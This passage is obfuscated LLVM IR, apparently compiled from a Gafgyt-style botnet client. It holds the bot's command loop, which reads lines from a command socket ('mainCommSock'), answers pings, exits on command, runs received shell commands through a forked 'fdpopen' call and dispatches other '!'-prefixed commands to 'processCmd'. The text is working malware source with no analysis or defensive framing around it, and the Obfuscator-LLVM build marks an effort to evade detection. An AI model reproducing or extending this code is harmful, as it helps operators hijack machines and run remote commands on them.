  %68 = getelementptr inbounds i32, i32* %63, i64 %67
  store i32 %66, i32* %68, align 4
  %.071 = add i32 %.07192, 1
  %69 = zext i32 %.071 to i64
  %70 = load i64, i64* @numpids, align 8
  %71 = icmp ult i64 %69, %70
  %72 = load i32*, i32** @pids, align 8
  br i1 %71, label %.lr.ph93, label %._crit_edge94.loopexit

._crit_edge94.loopexit:                           ; preds = %.lr.ph93
  br label %._crit_edge94

._crit_edge94:                                    ; preds = %._crit_edge94.loopexit, %.preheader
  %.071.in.lcssa = phi i32 [ %60, %.preheader ], [ %.07192, %._crit_edge94.loopexit ]
  %.lcssa = phi i32* [ %59, %.preheader ], [ %72, %._crit_edge94.loopexit ]
  %73 = zext i32 %.071.in.lcssa to i64
  %74 = getelementptr inbounds i32, i32* %.lcssa, i64 %73
  store i32 0, i32* %74, align 4
  %75 = load i64, i64* @numpids, align 8
  %76 = add i64 %75, -1
  store i64 %76, i64* @numpids, align 8
  %77 = shl i64 %75, 2
  %78 = call noalias i8* @malloc(i64 %77) #3
  %79 = bitcast i8* %78 to i32*
  %80 = icmp eq i64 %76, 0
  %81 = load i32*, i32** @pids, align 8
  br i1 %80, label %._crit_edge99, label %.lr.ph98.preheader

.lr.ph98.preheader:                               ; preds = %._crit_edge94
  br label %.lr.ph98

.lr.ph98:                                         ; preds = %.lr.ph98.preheader, %.lr.ph98
  %82 = phi i32* [ %91, %.lr.ph98 ], [ %81, %.lr.ph98.preheader ]
  %83 = phi i64 [ %88, %.lr.ph98 ], [ 0, %.lr.ph98.preheader ]
  %.17296 = phi i32 [ %87, %.lr.ph98 ], [ 0, %.lr.ph98.preheader ]
  %84 = getelementptr inbounds i32, i32* %82, i64 %83
  %85 = load i32, i32* %84, align 4
  %86 = getelementptr inbounds i32, i32* %79, i64 %83
  store i32 %85, i32* %86, align 4
  %87 = add i32 %.17296, 1
  %88 = zext i32 %87 to i64
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  %91 = load i32*, i32** @pids, align 8
  br i1 %90, label %.lr.ph98, label %._crit_edge99.loopexit

._crit_edge99.loopexit:                           ; preds = %.lr.ph98
  br label %._crit_edge99

._crit_edge99:                                    ; preds = %._crit_edge99.loopexit, %._crit_edge94
  %.lcssa87 = phi i32* [ %81, %._crit_edge94 ], [ %91, %._crit_edge99.loopexit ]
  %92 = bitcast i32* %.lcssa87 to i8*
  call void @free(i8* %92) #3
  store i8* %78, i8** bitcast (i32** @pids to i8**), align 8
  br label %93

; <label>:93:                                     ; preds = %.lr.ph102, %._crit_edge99
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %94 = ashr exact i64 %sext, 32
  %95 = load i64, i64* @numpids, align 8
  %96 = icmp ult i64 %94, %95
  br i1 %96, label %.lr.ph102, label %._crit_edge103.loopexit

._crit_edge103.loopexit:                          ; preds = %93
  br label %._crit_edge103

._crit_edge103:                                   ; preds = %._crit_edge103.loopexit, %.preheader84
  %97 = sext i32 %48 to i64
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %97
  store i8 0, i8* %98, align 1
  call void @trim(i8* nonnull %35)
  %strncmp = call i32 @strncmp(i8* nonnull %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %99, label %105

; <label>:99:                                     ; preds = %._crit_edge103
  %100 = load i32, i32* @mainCommSock, align 4
  %101 = call i32 (i32, i8*, ...) @sockprintf(i32 %100, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph115
  br label %.backedge

.backedge.loopexit135:                            ; preds = %.preheader116
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit135, %.backedge.loopexit, %._crit_edge112.thread, %99, %._crit_edge112, %107, %139
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = call i32 @recvLine(i32 %102, i8* nonnull %35, i32 4096)
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %.backedge86.loopexit, label %.preheader84

; <label>:105:                                    ; preds = %._crit_edge103
  %strncmp75 = call i32 @strncmp(i8* nonnull %35, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.107, i64 0, i64 0), i64 3)
  %cmp76 = icmp eq i32 %strncmp75, 0
  br i1 %cmp76, label %106, label %107

; <label>:106:                                    ; preds = %105
  call void @exit(i32 0) #17
  unreachable

; <label>:107:                                    ; preds = %105
  %108 = load i8, i8* %35, align 16
  %109 = icmp eq i8 %108, 33
  br i1 %109, label %.preheader116.preheader, label %.backedge

.preheader116.preheader:                          ; preds = %107
  br label %.preheader116

.preheader116:                                    ; preds = %.preheader116.preheader, %111
  %.069 = phi i8* [ %112, %111 ], [ %36, %.preheader116.preheader ]
  %110 = load i8, i8* %.069, align 1
  switch i8 %110, label %111 [
    i8 0, label %.backedge.loopexit135
    i8 32, label %113
  ]

; <label>:111:                                    ; preds = %.preheader116
  %112 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader116

; <label>:113:                                    ; preds = %.preheader116
  store i8 0, i8* %.069, align 1
  %114 = call i64 @strlen(i8* %36) #15
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %114
  %116 = getelementptr inbounds i8, i8* %115, i64 2
  br label %117

; <label>:117:                                    ; preds = %122, %113
  %118 = call i64 @strlen(i8* %116) #15
  %119 = add i64 %118, -1
  %120 = getelementptr inbounds i8, i8* %116, i64 %119
  %121 = load i8, i8* %120, align 1
  switch i8 %121, label %.preheader82.preheader [
    i8 13, label %122
    i8 10, label %122
  ]

.preheader82.preheader:                           ; preds = %117
  br label %.preheader82

; <label>:122:                                    ; preds = %117, %117
  store i8 0, i8* %120, align 1
  br label %117

.preheader82:                                     ; preds = %.preheader82.preheader, %124
  %.070 = phi i8* [ %125, %124 ], [ %116, %.preheader82.preheader ]
  %123 = load i8, i8* %.070, align 1
  switch i8 %123, label %124 [
    i8 32, label %126
    i8 0, label %126
  ]

; <label>:124:                                    ; preds = %.preheader82
  %125 = getelementptr inbounds i8, i8* %.070, i64 1
  br label %.preheader82

; <label>:126:                                    ; preds = %.preheader82, %.preheader82
  store i8 0, i8* %.070, align 1
  %127 = getelementptr inbounds i8, i8* %.070, i64 1
  %128 = load i8, i8* %116, align 1
  %129 = icmp eq i8 %128, 0
  br i1 %129, label %._crit_edge107, label %.lr.ph106.preheader

.lr.ph106.preheader:                              ; preds = %126
  br label %.lr.ph106

.lr.ph106:                                        ; preds = %.lr.ph106.preheader, %.lr.ph106
  %130 = phi i8 [ %135, %.lr.ph106 ], [ %128, %.lr.ph106.preheader ]
  %.068104 = phi i8* [ %134, %.lr.ph106 ], [ %116, %.lr.ph106.preheader ]
  %131 = zext i8 %130 to i32
  %132 = call i32 @toupper(i32 %131) #15
  %133 = trunc i32 %132 to i8
  store i8 %133, i8* %.068104, align 1
  %134 = getelementptr inbounds i8, i8* %.068104, i64 1
  %135 = load i8, i8* %134, align 1
  %136 = icmp eq i8 %135, 0
  br i1 %136, label %._crit_edge107.loopexit, label %.lr.ph106

._crit_edge107.loopexit:                          ; preds = %.lr.ph106
  br label %._crit_edge107

._crit_edge107:                                   ; preds = %._crit_edge107.loopexit, %126
  %137 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.108, i64 0, i64 0)) #15
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %152

; <label>:139:                                    ; preds = %._crit_edge107
  %140 = call i32 @listFork()
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %142, label %.backedge

; <label>:142:                                    ; preds = %139
  %143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %143, i8 0, i64 1024, i32 16, i1 false)
  %144 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %143, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i64 0, i64 0), i8* %127)
  %145 = call i32 @fdpopen(i8* nonnull %143, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.110, i64 0, i64 0))
  %146 = call i8* @fdgets(i8* nonnull %143, i32 1024, i32 %145)
  %147 = icmp eq i8* %146, null
  br i1 %147, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %142
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %143)
  call void @llvm.memset.p0i8.i64(i8* nonnull %143, i8 0, i64 1024, i32 16, i1 false)
  %148 = call i32 @sleep(i32 1) #3
  %149 = call i8* @fdgets(i8* nonnull %143, i32 1024, i32 %145)
  %150 = icmp eq i8* %149, null
  br i1 %150, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %142
  %151 = call i32 @fdpclose(i32 %145)
  call void @exit(i32 0) #17
  unreachable

; <label>:152:                                    ; preds = %._crit_edge107
  %153 = call i8* @strtok(i8* %127, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i64 0, i64 0)) #3
  store i8* %116, i8** %37, align 16
  %154 = icmp eq i8* %153, null
  br i1 %154, label %._crit_edge112.thread, label %.lr.ph111.preheader

.lr.ph111.preheader:                              ; preds = %152
  br label %.lr.ph111

._crit_edge112.thread:                            ; preds = %152
  call void @processCmd(i32 1, i8** nonnull %37)
  br label %.backedge

.lr.ph111:                                        ; preds = %.lr.ph111.preheader, %167
  %.065109 = phi i8* [ %168, %167 ], [ %153, %.lr.ph111.preheader ]
  %.066108 = phi i32 [ %.1, %167 ], [ 1, %.lr.ph111.preheader ]
  %155 = load i8, i8* %.065109, align 1
  %156 = icmp eq i8 %155, 10
  br i1 %156, label %167, label %157

; <label>:157:                                    ; preds = %.lr.ph111
  %158 = call i64 @strlen(i8* nonnull %.065109) #15
  %159 = add i64 %158, 1
  %160 = call noalias i8* @malloc(i64 %159) #3
  %161 = sext i32 %.066108 to i64
  %162 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %161
  store i8* %160, i8** %162, align 8
  %163 = call i64 @strlen(i8* nonnull %.065109) #15
  %164 = add i64 %163, 1
  call void @llvm.memset.p0i8.i64(i8* %160, i8 0, i64 %164, i32 1, i1 false)
  %165 = call i8* @strcpy(i8* %160, i8* nonnull %.065109) #3
  %166 = add nsw i32 %.066108, 1
  br label %167

; <label>:167:                                    ; preds = %.lr.ph111, %157
  %.1 = phi i32 [ %166, %157 ], [ %.066108, %.lr.ph111 ]
  %168 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.111, i64 0, i64 0)) #3
  %169 = icmp eq i8* %168, null
  br i1 %169, label %._crit_edge112, label %.lr.ph111

._crit_edge112:                                   ; preds = %167
  call void @processCmd(i32 %.1, i8** nonnull %37)
  %170 = icmp sgt i32 %.1, 1
  br i1 %170, label %.lr.ph115.preheader, label %.backedge

.lr.ph115.preheader:                              ; preds = %._crit_edge112
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph115

.lr.ph115:                                        ; preds = %.lr.ph115.preheader, %.lr.ph115
  %indvars.iv123 = phi i64 [ %indvars.iv.next124, %.lr.ph115 ], [ 1, %.lr.ph115.preheader ]
  %171 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv123
  %172 = load i8*, i8** %171, align 8
  call void @free(i8* %172) #3
  %indvars.iv.next124 = add nuw nsw i64 %indvars.iv123, 1
  %exitcond = icmp eq i64 %indvars.iv.next124, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph115
}

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @prctl(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #5

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612306}
!2 = !{i32 -2146610866}
!3 = !{i32 -2146610043}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146609223}
!7 = !{i32 -2146607762}
!8 = !{i32 -2146606900}
!9 = !{i32 -2146606179}
